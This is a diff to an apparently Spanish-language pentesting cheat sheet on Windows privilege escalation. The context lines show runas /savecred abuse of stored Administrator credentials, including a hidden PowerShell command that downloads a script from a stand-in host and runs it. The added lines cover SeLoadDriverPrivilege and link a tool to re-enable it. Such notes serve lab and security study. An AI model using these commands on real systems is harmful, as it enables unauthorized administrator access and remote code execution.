@@ -368,3 +368,8 @@ C:\Users\security\Desktop>
     - **Ejecutar un comando en PowerShell interactivo**: `runas /user:ACCESS\Administrator /savecred "powershell.exe -Command Get-Process"`
     - **Abrir el Explorador de Windows como administrador**: `runas /user:ACCESS\Administrator /savecred "explorer.exe"`
     - **Ejecutar un script remoto**: `runas /user:ACCESS\Administrator /savecred "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"`
+
+
+## SeLoadDriverPrivilege
+- Este privilegio permite la habilidad de cargar drivers en el sistema.
+- Si aparece en `whoami /priv` como `Disabled` podemos utilizar [este .exe](https://github.com/G4sp4rCS/CPP-EnableSeLoadDriverPrivilege) para re-habilitarlo
